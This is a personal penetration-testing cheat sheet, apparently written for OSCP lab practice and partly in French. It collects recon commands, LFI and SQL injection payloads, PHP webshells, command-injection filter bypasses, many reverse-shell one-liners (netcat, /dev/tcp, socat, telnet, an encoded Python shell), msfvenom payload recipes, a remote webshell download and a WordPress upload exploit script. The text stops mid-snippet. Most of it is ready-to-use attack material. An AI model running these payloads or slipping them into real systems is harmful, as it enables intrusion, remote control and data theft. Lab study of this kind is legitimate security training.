# Links

https://fareedfauzi.gitbook.io/oscp-notes/

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
https://guif.re/bo
http://blog.commandlinekungfu.com/
https://kooksec.blogspot.com/2015/09/i-tried-harder-oscp-edition.html
https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0
https://www.hackingarticles.in/penetration-testing/
https://gtfobins.github.io/
https://explainshell.com
https://www.grymoire.com/
https://www.win.tue.nl/~aeb/linux/hh/hh.html
https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob.html
https://m8r0wn.com/posts/2020/02/oscp.html
https://github.com/m0nad/awesome-privilege-escalation
https://chousensha.github.io/blog/archives/
https://www.aldeid.com/wiki/Main_Page
https://www.mogozobo.com/?p=2848
https://zayotic.com/
https://www.mogozobo.com/?p=2848
https://www.five86.com/
https://blog.mzfr.me/
https://github.com/0x4D31/awesome-oscp
http://thegreycorner.com/
https://github.com/stephenbradshaw
https://highon.coffee/
https://blog.g0tmi1k.com
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://www.sans.org/blog/escaping-restricted-linux-shells/
I started to use g0tmilk Linux Privilege Escalation checklist
https://0xatom.github.io

https://github.com/g0tmi1k
https://explainshell.com/
https://book.hacktricks.xyz/
https://github.com/carlospolop/hacktricks
https://github.com/Hack-with-Github/Awesome-Hacking

https://www.hackingarticles.in/multiple-ways-to-secure-ssh-port/
https://pinkysplanet.net/

https://www.hackingtutorials.org/metasploit-tutorials/metasploit-commands/
https://7ms.us/tag/walkthrough/

https://pentesterlab.com/exercises/web_for_pentester/course
https://pentesterlab.com/exercises/web_for_pentester_II/course

https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html

https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/
https://digital-forensics.sans.org/community/cheat-sheets


https://github.com/Ignitetechnologies/Privilege-Escalation

https://github.com/liparus/cybersecurity_cheatsheets
https://github.com/l34n/CySecBooks



http://frequentlyinaccurate.net/tag/infosec/




https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
https://tools.kali.org/tools-listing


# Reconnaisance

## Scan IP
```bash

sudo netdiscover -i vboxnet0 -r 192.168.110.0/24
fping --quiet --alive --generate 192.168.110.0/24
sudo nmap -PE -sn -n 192.168.110.0/24
sudo nmap -sP 192.168.110.0/24

```

```bash

#bash scan_ip.sh

for ip in $(seq 1 254); do
ping -c 1 192.168.110.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done




```
```bash

for ip in 1 192.168.110.{1..254}; do ping -c 1 $ip > /dev/null && echo "${ip} is up"; done

```
```bash

#!/bin/bash
TF=$(mktemp -u)
touch $TF
is_alive_ping()
{
  ping -c 1 $1 > /dev/null
  [ $? -eq 0 ] && echo Node with IP: $i is up. >> $TF
}

for i in 192.168.0.{1..254} 
do
is_alive_ping $i & disown
done
sleep 1
cat $TF
rm $TF


```


## Open ports inbound


```bash

for i in $(seq 1 65535); do nc -z -v 192.168.3.50 $i 2>&1 | grep 'open'; done
for i in $(seq 1 65535); do nc -nvz -w 1 192.168.212.4 $i 2>&1; done | grep -v "refused"

```


## open port outbound

    #Top ports nmap -oG - -v --top-ports 10
    bttai@debian:~/OSCP/boxes/sickos$ cat ping.sh 
    ports="21 22 23 25 80 110 443 8080 8443"
    for port in $(seq 0 9000); do
        nc -lvp $port > /dev/null 2>&1 &
        #ls -al > /dev/null 2>&1 &
        nc_pid=$!
        echo $port
        cmd="nc -z -w 1 192.168.158.1 $port && echo '$port connexion successful'
           #    || echo '$port connexion failed'"
        #echo $cmd
        
        curl -G --data-urlencode "c=$cmd" --url http://192.168.158.133/test/cmd.php
        #nc -z -w 1 192.168.158.1 $port && echo "successful" || echo "failed"
        
        kill $nc_pid 2>/dev/null
    done






## Scan Web services

    nikto -h http://192.168.110.54
    gobuster
        -f, --add-slash
        -x, --extension
        -u, --url string
        -k, --no-tls-validation
        -w, --wordlist string

    gobuster dir --url 192.168.110.54  --wordlist directory-list-2.3-medium.txt -x html,php,txt -t 20

    dirb http://192.168.110.54 -X .php,.txt
    wfuzz
        -c Output with colors
        -z payload
        --hc/hl/hw/hh N[,N]+ : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
        --sc/sl/sw/sh N[,N]+ : Show responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
        --ss/hs regex   : Show/hide responses with the specified regex within the content

        wfuzz -c -z file,directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.38/FUZZ.php
        wfuzz -c -z file,directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.48/FUZZ/

    ffuf -c -w directory-list-2.3-medium.txt -u http://192.168.110.48/FUZZ  -t 100
    ffuf -c -w directory-list-2.3-medium.txt -u http://10.10.10.10/FUZZ -e php,html -or -of md -o results.md
    ffuf -w dirsearch/directory-list-2.3-medium.txt -X POST -d "url=dev/FUZZ.xml" -u http://10.10.10.123/upload.php -H "Cookie: PHPSESSID=j1nanul898l0fbr8bt2vgb548a" -H "Host: vuln.host.com" -H "Referer: http://backup.forwardslash.htb/profilepicture.php" -H "Content-Type: application/x-www-form-urlencoded" -fw 111 -t 300


        -b : Cookie data `"NAME1=VALUE1; NAME2=VALUE2"`
        -c : Colorize output
        -w : Wordlist file path
        -u : Target URL
        -d : POST data

    dirsearch.py -u http://192.168.110.48 -w directory-list-2.3-medium.txt -e txt,php -f -x 400,403,404 

    curl -v http://10.10.10.10/robots.txt
    curl -k -v https://10.10.10.10/robots.txt
    curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://10.10.10.10/robots.txt
    curl -v -X OPTIONS http://10.10.10.10/test

    #Identifier les méthodes HTTP autorisées
    curl -X OPTIONS http://example.org -i


## HTTP Basic Authentication


    hydra -L users.txt -P words.txt www.site.com http-head /private/
    

### WordPress

    wpscan --url http://192.168.110.54/wp
    wpscan --url http://192.168.110.54/wp --enumerate u
    wpscan --url http://192.168.110.54/wp --usernames users.txt --passwords passwords.txt --password-attack xmlrpc
    wpscan --url http://192.168.110.54/wp --plugins-version-detection aggressive --plugins-detection aggressive  --detection-mode aggressive

### Drupal

    droopescan

### Joomla

    joomscan


### CUPS

    http://a.b.c.d:631

### ngircd
    
default password in /etc/ngircd/ngircd.conf is wealllikedebian

Software : HexChat

## Identifier les vulnérabilités

    sudo nmap -n -Pn -sV --script vuln,exploit -p21,22,80 -O 192.168.110.54

    searchsploit



# Tools

hydra -t 4 -L users.txt -P passwords.txt ssh://192.168.110.54

telnet

netcat
ncat
socat : https://github.com/andrew-d/static-binaries
    TCP reverse shell
    listen:
    socat file:`tty`,echo=0,raw tcp-listen:80
    exec:
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:80

    socat tunnel
    socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:80  
    socat TCP-LISTEN:8085,fork,reuseaddr TCP:127.0.0.1:65334  

    Stable TTY bind
    victim:
    socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane  
    Connect from local:
    socat FILE:`tty`,raw,echo=0 TCP:192.168.0.74:1337 

    bind a binary to a port
    exec socat TCP-LISTEN:31337,fork,reuseaddr EXEC:/home/leak,echo=0,pty,stderr
      
    Fork a port:
    socat TCP-LISTEN:4444,fork TCP:localhost:1337

mitm ipv6 proxy
ipv4 (capture in burp)
socat TCP-LISTEN:80,fork,reuseaddr TCP:127.0.0.1:8080
ipv6:
socat -v tcp4-listen:5985,reuseaddr,fork tcp6:[dead:babe::1001]:5985
pwncat
john
    ./john password --format=raw-md5  --wordlist=dico --rules
hashcat
hash : mimikatz / craclmapexec
 pass de hash

wordslist
passwords reuse

## nmap
    
sudo nmap -n -Pn -p- -O 192.168.110.54
sudo nmap -n -Pn -sV -p21,22,80 -O 192.168.110.54
sudo nmap -n -Pn -sV --script default -p21,22,80 -O 192.168.110.54
sudo nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst,ssh-brute.timeout=4s <target>
$ nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <target>
$ nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.domain=<domain> $ip  
$ nmap -p25 --script smtp-enum-users --script-args userdb=users.txt smtp-enum-users.domain=TORMENT.localdomain smtp-enum-users.methods=VRFY $ip
$ nmap -p25 --script smtp-enum-users $ip


 /usr/share/legion/scripts/smtp-user-enum.pl -M VRFY -U users.txt -t 192.168.110.63

## sed


```console

# garder seulement le texte entre <pre> text </pre>
sed 's/<pre>/<pre>\n/g' 
sed -n '/<xxxxx/,/<\/xxxxx/p'
sed -n '/<div id="footer"/,/<\/div/p'
# delete @ at the begining of lines
sed 's/^@\(.*\)/\1/' 
# Supprimer toutes les balises
sed -e 's/<[^>]*>//g'
sed 's/<\/\?[^>]\+>//g'
# Supprimer la première ligne et la dernière ligne
sed -r -e '1d' -e '$d' -e 's/^\s+//'
# Supprimer tout sauf entre 2 balises
sed '/<div class="content">/,/<\/div>/!d'
sed -n '/<div class="content">/,/<\/div/p'
```

curl

Tar file
    # create
    tar -czvf file.tar.gz /path/to/dir1
    
    # list the contents of a tar file
    tar -ztvf file.tar.gz
    
    # extract a tar flile
    tar -xvf file.tar.gz
    tar -xzvf file.tar.gz
    tar -xzvf file.tar.gz -C /tmp/



## Steganography

exiftool
steghide
    steghide embed -ef <txt filename> -cf <media filename>
    steghide extract -sf <media filename>
    steghide embed -ef <txt filename> -cf <media filename> -p  <password>
    steghide info <media filename>
stepic -d -i kvasir.png | xxd -p -r > k.png

```bash
#bruteforce
#!/bin/bash
for word in ` cat rockyou.txt `
do
    steghide extract -sf stego.jpg -p $word
done
```

## tcpdump
https://danielmiessler.com/study/tcpdump/

sudo tcpdump -i vboxnet0 icmp -X
tcpdump host 1.1.1.1
tcpdump src 1.1.1.1
tcpdump dst 1.0.0.1
tcpdump net 1.2.3.0/24
tcpdump -c 1 -X icmp
tcpdump port 3389
tcpdump portrange 21-23
-X : Show the packet’s contents in both hex and ASCII.
-c : Only get x number of packets and then stop.


# Exploit LFI

    cat cmd.txt
    <?php phpinfo(); ?>
    echo $(cat cmd.txt) | base64
    PD9waHAgcGhwaW5mbygpOyA/Pgo=



http://192.168.56.3/lfi.php?p=data://text/plain,%3C?php%20phpinfo();?%3E
http://192.168.56.3/lfi.php?p=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
http://192.168.56.3/lfi.php?p=php://filter/convert.base64-encode/resource=/etc/passwd
http://192.168.56.3/lfi.php?p=php://filter/convert.base64-encode/resource=lfi.php
http://192.168.56.3/lfi.php?p=php://filter/read=convert.base64-encode/resource=lfi.php
http://192.168.56.3/lfi.php?p=http://192.168.56.3/cmd.txt

# SQL Injection

    GET
    POST
    PUT
    X-FORWARDED-FOR: 127.0.0.1' or 1=1#
    User-Agent: aaa' or 1/*
    Referer: http://www.yaboukir.com
    Cookie: abbcd' or 't'='t

## Detection of PHP include

    - a parent directory can be added: include("includes/".$_GET["page"]);;
    - a file extension can be added: include($_GET["page"].".php");;
    - the value can be sanitized: include(basename($_GET["page"]));;
    - or all of the previous actions can be performed include("includes/".basename($_GET["page"]).".php");.

## Exploitation of local file include

- inject the PHP code in the web server log
- inject the PHP code in an email
- upload a file and including it, you can for example upload an image and put your PHP code in the image's comment section (so it won't get modify if the image is resized).
- upload the PHP code via another service: FTP, NFS, ...
- what extension can be uploaded;
- what content type can be uploaded


https://highon.coffee/blog/lfi-cheat-sheet/


## Null Byte (encoded as %00)

    http://vulnerable/index.php?page=../../../../../etc/passwd%00

## Upload fake file

https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

```bash

#cat shell.pdf 
%PDF-1.5
<?php system($_GET["cmd"]); ?>

```

```bash

<FilesMatch "\.ph(p[2-6]?|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>


```


   

## Path Traversal aka Directory Traversal

    /etc/passwd
    ../../../etc/passwd

# PHP Wrapper

<https://www.php.net/manual/fr/wrappers.php>

## PHP Wrapper expect:// LFI

    http://127.0.0.1/fileincl/example1.php?page=expect://ls


## PHP Wrapper php://file

http://192.168.183.128/fileincl/example1.php?page=php://input

Post Data payload, try something simple to start with like: 
    - <? system('uname -a');?>
    - <? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>

## PHP Wrapper php://filter

http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd

## /proc/self/environ LFI Methodology%20and%20Resources

    User Agent
    /proc/self/environ


## /proc/self/fd/ LFI Method

    referer
    /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc

## PHP data://text/plain

    /index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==

Boxes : relativity
    






# Remote file access

    http://vulnerable/index.php?page=http://www.google.com/?

## exploit

http://vulnerable/index.php?page=http://yourserver/webshell.txt&cmd=ifconfig

```php    
#webshell.txt
<?php
  system($_GET["cmd"]);
?>
```

## preg_replace

```php

preg_replace("/blabla/e", system('id'), "lorem")

```
## usort

    ?order=id);%7dsystem(%27ls%20-al%27)
    ?order=id);}system('uname%20-a');//
    ?order=id);}system('ls');//

## asert

```php
assert(trim("'".$_GET['name']."'"));
```


## Fatal errors : https://www.fatalerrors.org/a/summarize-code-execution-and-command-execution.html

    (1).eval() executes the string as a function
    (2).assert() 
    (3).call_user_func() 
    (4).call_user_fuc_array()
    (5)preg_replace() 
    (6)array_map() 
    (7)array_filter
    (8)usort uses user-defined functions to sort arrays
    (9)uasort() uses a user-defined comparison function to sort the array values
    (10) The php code in the middle of ${}

    2. Order execution
1. Common command execution functions

    (1)system() can execute system commands and output them
    (2)exec() executes the command, but no output.
    (3)passthru executes command output
    (4)shell_exec executes the command without echo
    (5) Reverse question mark, execute the shell command, and return the output string
    (6)ob_start turns on the output control buffer
    
    
(1) Common separator

Line break %0a
Carriage return %0d
Continuous instruction;
Background process&
Pipe symbol|
Logic&&
(2) Bypass spaces

    $IFS
    <
    ${IFS}
    $IFS$9
    $%09

(3) Various symbols

    1 echo "${PATH:0:1}"
    2 echo "`expr$IFS\substr\$IFS\$(pwd)\$IFS\1\$IFS\1`"
    3 echo `$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)`
    4 expr${IFS}substr${IFS}$SESSION_MANAGER${IFS}6${IFS}1

    %0a，%0d，%00，%20

(4) Impression character bypass

    Variable bypass: a=l;b=s;$a$b
 
(5) code bypass

    echo 'cat' |base64

(6) Undefined initialization variable

    cat $b /etc/passwd

(7) connector

    cat /etc/pass'w'd

(8) use wildcards

    /???/?s --help

(9) No echo

    Use the delay function, such as: ls|sleep 3
    Use http, for example: ls|curl ip:port
    Using DNS

(10) Length bypass

    For example, 15 bit command execution, 7-bit command execution, 5-bit command execution and 4-bit command execution
    https://xz.aliyun.com/t/1579

(11) Command execution without alphanumeric

    1. Exclusive or
    2. Reverse
    3. Self increasing

# upgrade shell

    python -c 'import pty;pty.spawn("/bin/bash")'
    $ ^Z
    debian@debian:~$ echo $TERM
    xterm-256color
    debian@debian:~$ stty -a
    ...rows 27; columns 105; ...
    debian@debian:~$ stty raw -echo
    debian@debian:~$ fg
    debian@debian:~$ nc -lvp 1234
                                 reset
    reset: unknown terminal type unknown
    Terminal type? xterm-256color
    bash-4.2$ export TERM=xterm-256color
    bash-4.2$ export SHELL=bash
    bash-4.2$ stty rows 27 columns 105

# Exploit - Remote Commande execution (RCE)

    ;
    &
    &&
    |
    ||
    ;
    0x0a, \n
    `command`
    $(command)
    ; command ;
    ;; command ;;


# Post-exploitation

## Transfert de fichiers

    wget
    curl
    xxd
    od
    base64



## Elévation de privilèges (privilege escalation) privEsc
    
    sudo -l
    sudo /bin/bash -p
    fichier texte
    notes
    mail
    mouvement latéral
    pivoting

### Tools
https://www.hackingarticles.in/linux-privilege-escalation-automated-script/


LinPEAS : https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

    -s (superfast & stealth): This will bypass some time-consuming checks and will leave absolutely no trace.
    -P (Password): Pass a password that will be used with sudo -l and Bruteforcing other users
    -h Help Banner
    -o Only execute selected checks
    -d <IP/NETMASK> Discover hosts using fping or ping
    ip <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports using nc

LinEnum : https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

    -k Enter keyword
    -e Enter export location
    -t Include thorough (lengthy) tests
    -s Supply current user password to check sudo perms (INSECURE)
    -r Enter report name
    -h Displays help text

LES: Linux Exploit Suggester https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

LinuxPrivChecker : https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py

Metasploit: Local_Exploit_Suggester

    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set lhost 192.168.0.13
    msf6 exploit(multi/handler) > set payload generic/shell_reverse_tcp
    # or
    msf6 exploit(multi/handler) > set payload set payload linux/x86/shell_reverse_tcp

    msf6 exploit(multi/handler) > run

    nc 192.168.0.13 4444 -e /bin/sh
    
    ^Z
    Background session 1? [y/N]  y
    msf6 exploit(multi/handler) > sessions  -u 1
    msf6 exploit(multi/handler) > sessions 2
    
    ^Z
    meterpreter > 
    Background session 2? [y/N]
    
    msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
    msf6 post(multi/recon/local_exploit_suggester) > set SESSION 2
    use post/multi/recon/local_exploit_suggester
    msf6 post(multi/recon/local_exploit_suggester) > run


pspy : https://github.com/DominicBreuker/pspy it allows you to see commands run by other users, cron jobs, etc


# Forensics

```bash

find / -perm -u=s -type f  2>/dev/null | xargs ls -l
find / -perm -g=s -type f 2>/dev/null| xargs ls -l

find / -type f -writable 2>/dev/null | grep -v '^/proc'| grep -v '^/sys' | xargs ls -l
find / -user root -writable 2>/dev/null | grep -v '/proc' | grep -v '/dev'

find  /home -name ".bash_history" 2>/dev/null -exec cat {} \;
for file in $(find . -name '*.php'); do cat $file; done

find / -type f -newermt 2020-02-10 ! -newermt 2020-02-28 -ls 2>/dev/null

grep -Er '(preg_replace|phpinfo()|system)' * | grep '.php:'


# Bash find files between two dates:
find . -type f -newermt 2010-10-07 ! -newermt 2014-10-08

# Bash find files from 15 minutes ago until now:

find . -type f -mmin -15

#Bash find files between two timestamps:
find . -type f -newermt "2014-10-08 10:17:00" ! -newermt "2014-10-08 10:53:00"

find / -type f -name user.txt -exec cat {} \; 2> /dev/null


```

## Persistance
    
    cron, command and control

## Effacement de trace

## Bind et Reverse shell
    
### Bin shell

    connexion ssh
    nc 1234 -e /bin/sh

### Reverse shell

    # attacker
    nc -nlvp 1234

    # victime
    # netcat
    nc <attacker_ip> 1234 -e /bin/bash

    # netcat with GAPING_SECURITY_HOLE disabled
    mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe

    # without netcat
    /bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1

    # use  telnet
    mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
    
    TF=$(mktemp -u)
    mkfifo $TF && telnet <attacker_ip> <port> 0<$TF | /bin/sh 1>$TF


    # telnet-to-telnet
    nc -nlvp <port1>
    nc -nlvp <port2>
    telnet <attacker_ip> <port1> | /bin/bash | telnet <attacker_ip> <port2>
    
    # PHP reverse shell via interactive console
    wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php

    # socat
    # attacker
    socat file:`tty`,raw,echo=0 tcp-listen:<port>

    # victim:
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:<port>


    # msfvenom https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

    # Binaries payload

    #Staged payload
    msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -a x86 -f elf > shell-x86.elf
    msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -a x64 -f elf > shell-x64.elf

    #Stageless Payloads
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf



    # Web Payloads
    msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
    jsp msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
    war msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
    php msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php



### Use msfvenom to generate reverse shell command

https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/
    
    msfvenom -p cmd/unix/reverse_perl lhost=192.168.1.1 lport=443 R
    perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.1.1:443");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'

    msfvenom -p cmd/unix/reverse_python lhost=192.168.1.1 lport=443 R
    python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICBzdWJwcm9jZXNzICAgICAgICAsICAgIG9zICAgICA7ICAgIGhvc3Q9IjE5Mi4xNjguMS4xIiAgICAgOyAgICBwb3J0PTQ0MyAgICAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAgICwgICAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgOyAgICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgICAgcG9ydCkpICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAwKSAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgMSkgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgIDIpICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"

    msfvenom -p cmd/unix/reverse_netcat lhost <attacker_ip> lpost <port> R
    mkfifo /tmp/ffvdua; nc 192.168.0.13 443 0</tmp/ffvdua | /bin/sh >/tmp/ffvdua 2>&1; rm /tmp/ffvdua
    
    msfvenom -p cmd/unix/reverse_bash lhost <attacker_ip> lpost <port> R
    0<&21-;exec 21<>/dev/tcp/192.168.0.13/443;sh <&21 >&21 2>&21
    
    msfvenom -p cmd/unix/reverse_netcat_gaping lhost=192.168.1.1 lport=443 R
    nc 192.168.0.13 443 -e /bin/sh

    msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
    cmd/unix/bind_awk
    cmd/unix/bind_busybox_telnetd
    cmd/unix/bind_inetd
    cmd/unix/bind_jjs
    cmd/unix/bind_lua
    cmd/unix/bind_netcat
    cmd/unix/bind_netcat_gapingproftpd-1.3.5
    cmd/unix/bind_netcat_gaping_ipv6
    cmd/unix/bind_nodejs
    cmd/unix/bind_perl
    cmd/unix/bind_perl_ipv6
    cmd/unix/bind_r
    cmd/unix/bind_ruby
    cmd/unix/bind_ruby_ipv6
    cmd/unix/bind_socat_udp
    cmd/unix/bind_stub
    cmd/unix/bind_zsh
    cmd/unix/generic
    cmd/unix/interact
    cmd/unix/pingback_bind
    cmd/unix/pingback_reverse
    cmd/unix/reverse
    cmd/unix/reverse_awk
    cmd/unix/reverse_bash
    cmd/unix/reverse_bash_telnet_ssl
    cmd/unix/reverse_bash_udp
    cmd/unix/reverse_jjs
    cmd/unix/reverse_ksh
    cmd/unix/reverse_lua
    cmd/unix/reverse_ncat_ssl
    cmd/unix/reverse_netcat
    cmd/unix/reverse_netcat_gaping
    cmd/unix/reverse_nodejs
    cmd/unix/reverse_openssl
    cmd/unix/reverse_perl
    cmd/unix/reverse_perl_ssl
    cmd/unix/reverse_php_ssl
    cmd/unix/reverse_python
    cmd/unix/reverse_python_ssl
    cmd/unix/reverse_r
    cmd/unix/reverse_ruby
    cmd/unix/reverse_ruby_ssl
    cmd/unix/reverse_socat_udp
    cmd/unix/reverse_ssh
    cmd/unix/reverse_ssl_double_telnet
    cmd/unix/reverse_stub
    cmd/unix/reverse_tclsh
    cmd/unix/reverse_zsh



# Metasploit



# msfvenom

    msfvenom -a x86 --platform linux -p linux/x86/exec -f py -b '\x0d\x0a\x00\xff' CMD=/bin/sh PrependSetresuid=true
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev &>/dev/null
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x64 --platform linux -f elf -o rev
    msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf -a x86 -o rev

    #Tomcat
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=1234 -f war > update.war
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war




# Bash

    $0 : Contient le nom du script tel qu'il a été invoqué
    $1 : Le premier paramètre
    $* : L'ensembles des paramètres sous la forme d'un seul argument
    $@ : L'ensemble des arguments, un argument par paramètre
    $# : Le nombre de paramètres passés au script
    $? : Le code retour de la dernière commande
    $$ : Le PID du shell qui exécute le script
    $! : Le PID du dernier processus lancé en arrière-plan

    echo $PATH
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    export PATH=/tmp:$PATH


## Boucle imite command line

```bash

#!/bin/bash

HOST=192.168.110.11
SHELL=dev_shell.php
printf "$ "
while read line
do
    if [[ "$line" == "exit" ]]; then
        break
    fi
    curl -s --data-urlencode "in_command=$line" http://$HOST/$SHELL | sed '/<h5>/,/<\/div>/!d' | sed -r -e '1d' -e '$d' -e 's/^\s+//'
    printf "$ "
done < "/proc/${$}/fd/0"


```
## Templates


```bash

#authenticate + cookie + exploit
#!/bin/bash

HOST=derpnstink.local
BLOG=weblog
USER=admin
PASS=$USER
VULN="wp-admin/admin.php?page=slideshow-slides&method=save"
FILE=$1

# authenticate
curl \
    -s \
    -c cookie \
    -d "log=$USER&pwd=$PASS&wp-submit=Log" \
    http://$HOST/$BLOG/wp-login.php

# exploit
curl \
    -s \
    -b cookie \
    -H "Expect:" \
    -o /dev/null \
    -F "Slide[id]=" \
    -F "Slide[order]=" \
    -F "Slide[title]=$(mktemp -u | sed -r 's/^.*tmp\.(.*)$/\1/')" \
    -F "Slide[description]=" \
    -F "Slide[showinfo]=both" \
    -F "Slide[iopacity]=70" \
    -F "Slide[galleries][]=1" \
    -F "Slide[type]=file" \
    -F "image_file=@$FILE;filename=$FILE;type=application/octet-stream" \
    -F "Slide[image_url]=" \
    -F "Slide[uselink]=N" \
    -F "Slide[link]=" \
    -F "Slide[linktarget]=self" \
    -F "submit=Save Slide" \
    http://$HOST/$BLOG/$VULN

# cleanup
rm -rf cookie

```


```bash

##
# Glasgow Smile 2 Authentication Script
#
#########################################################################################################################
##
#script for authentication in progress. At the moment it only works with a single command.

curl -u user:password http://localhost/Glasgow---Smile2/
# Don't use commands like that in automated scripts, I saved a file with some network traffic packets captured.
# Analyze it and delete the script.I don't have permission to do it. Stupid Asshole.

# Base URL of your web site.
#site_url="http://example.com"

# Endpoint URL for login action.
#login_url="$site_url/service/path/user/login"


# Path to temporary file which will store your cookie data.
#cookie_path=/tmp/cookie

# URL of your custom action.
#action_url="$site_url/service/path/custom/action"

# This is data that you want to send to your custom endpoint.
#data="name=Alex&hobby=Drupal"

##
# Logic. Most likely you shouldn't change here anything.
##

# Get token and construct the cookie, save the returned token.
#token=$(curl -b $cookie_path -c $cookie_path --request GET "$site_url/services/session/token" -s)

# Authentication. POST to $login_url with the token in header "X-CSRF-Token: $token".
#curl -H "X-CSRF-Token: $token" -b $cookie_path -c $cookie_path -d "username=$username&password=$password" "$login_url" -s

# Get new token after authentication.
#token=$(curl -b $cookie_path -c $cookie_path --request GET "$site_url/services/session/token" -s)

# Send POST to you custom action URL. With the token in header "X-CSRF-Token: $token"
#curl -H "X-CSRF-Token: $token" -b $cookie_path -c $cookie_path -d "$data" "$action_url" -s

```


# C

```c
# asroot.c
#include <stdio.h>
#include <stdlib.h>

int main(void){
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system("/bin/bash");
    return 0;
}
```


# Python

```python
## asroot.py
import os
os.system('/bin/bash')

```
```python
## read from sys.stdin

import sys

for line in sys.stdin:
    line = line.rstrip()
    if 'exit' == line.rstrip():
        break
    print(f'Processing Message from sys.stdin *****{line}*****')
print("Done")

```


```python
# requests : post, get cookie
import requests
import string

session = requests.Session()
url = "http://888.darknet.com/"

response = session.get(url)

cookies = session.cookies.get_dict()
files = {'upload': open('file.txt','rb')}
data = {"username":"admin", "password":"xxxxxxxx", "action":"Login"}
headers = {'user-agent': 'my-app/0.0.1'}

r = session.post(url, files=files, data=data, cookies=cookies,  headers=headers)
url_main  = r.url
r = requests.get(url_main, cookies=cookies)
print (r.text)

# cookies = session.cookies.get_dict()
# print (cookies)


```

```python

#!/usr/bin/python3
import requests as req
import re

